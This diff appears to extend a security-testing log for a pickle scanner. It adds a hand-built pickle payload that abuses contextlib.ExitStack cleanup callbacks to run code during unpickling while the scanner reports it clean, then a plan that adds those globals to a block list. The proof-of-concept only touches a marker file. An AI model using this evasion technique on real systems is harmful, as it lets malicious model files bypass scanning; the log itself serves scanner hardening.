@@ -1477,3 +1477,103 @@ Blocking plan:
 Performance note: the fix adds three tuples to a sorted static table checked
 with binary search. It does not add scheduler state modeling, event queue
 simulation, or broader callback-flow tracking.
+
+## Turn 37 - `contextlib.ExitStack` cleanup-callback dispatch gap
+
+Goal: produce another immediate RCE-capable pickle that
+`packages/modelaudit-picklescan` does not flag.
+
+Payload shape:
+
+```python
+from pathlib import Path
+
+
+def s(value: str) -> bytes:
+    data = value.encode()
+    return b"\x8c" + bytes([len(data)]) + data
+
+
+def sg(module: str, name: str) -> bytes:
+    return s(module) + s(name) + b"\x93"
+
+
+marker = Path("/tmp/ma_contextlib_exitstack_marker")
+payload = b"".join(
+    [
+        b"\x80\x04",
+        sg("contextlib", "ExitStack"),
+        b")R\x94",
+        sg("contextlib", "ExitStack.callback"),
+        b"(",
+        b"h\x00",
+        sg("pathlib", "Path.touch"),
+        sg("pathlib", "PosixPath"),
+        b"(",
+        s("/"),
+        s("tmp"),
+        s("ma_contextlib_exitstack_marker"),
+        b"tR",
+        b"tR0",
+        sg("contextlib", "ExitStack.close"),
+        b"h\x00",
+        b"\x85R.",
+    ]
+)
+```
+
+Proof on CPython 3.12.12:
+
+- Scanner result: `status=complete`, `verdict=clean`, `is_clean=True`,
+  `findings=[]`
+- Scanner import references:
+  `contextlib.ExitStack`, `contextlib.ExitStack.callback`,
+  `pathlib.Path.touch`, `pathlib.PosixPath`, and
+  `contextlib.ExitStack.close`, all with `is_dangerous=False`
+- Unpickle result: creates `/tmp/ma_contextlib_exitstack_marker` before
+  `pickle.loads()` returns and returns `None`
+- RCE mechanism: the pickle constructs a `contextlib.ExitStack()` object,
+  memoizes it, calls
+  `ExitStack.callback(stack, pathlib.Path.touch, marker)` to register an
+  attacker-selected cleanup callback with attacker-controlled arguments,
+  discards the returned callback, then calls `ExitStack.close(stack)` on the
+  same memoized stack. `close()` dispatches the registered callback during
+  unpickling.
+
+Why the scanner missed it:
+
+- `contextlib` is absent from both `DANGEROUS_WILDCARD_MODULES` and
+  `DANGEROUS_GLOBALS`.
+- The payload uses only currently clean globals: `contextlib.ExitStack`,
+  `contextlib.ExitStack.callback`, `contextlib.ExitStack.close`,
+  `pathlib.Path.touch`, and `pathlib.PosixPath`.
+- There are no suspicious string seeds such as `eval(`, `exec(`, `__import__`,
+  `os.system`, or `subprocess`.
+
+Performance note: this is another arbitrary-callback dispatch sink hidden
+behind a cleanup abstraction. The focused next block should add sorted
+`DANGEROUS_GLOBALS` entries for `("contextlib", "ExitStack.callback")`,
+`("contextlib", "ExitStack.close")`, and
+`("contextlib", "ExitStack.__exit__")`, plus a manual-pickle oracle regression
+for the memoized `ExitStack` proof. The hot path remains static policy lookup.
+
+## Turn 38 - Block `contextlib.ExitStack` cleanup callbacks
+
+Blocking plan:
+
+- Add `("contextlib", "ExitStack.callback")`,
+  `("contextlib", "ExitStack.close")`, and
+  `("contextlib", "ExitStack.__exit__")` to the sorted Rust
+  `DANGEROUS_GLOBALS` table. `contextlib.ExitStack` itself stays allowed
+  because it only creates the stack; `callback` wires attacker-selected cleanup
+  callbacks and `close`/`__exit__` dispatch registered callbacks.
+- Add portable policy coverage for all three raw global reductions so
+  detection does not depend on cleanup timing.
+- Add a CPython oracle regression that manually builds the memoized
+  `ExitStack` payload, verifies scanner detection for `ExitStack.callback` and
+  `ExitStack.close`, then proves the cleanup callback creates the marker during
+  `pickle.loads()`.
+
+Performance note: the fix adds three tuples to a sorted static table checked
+with binary search. It does not add cleanup-stack state modeling,
+context-manager simulation, or broader callback-flow tracking.
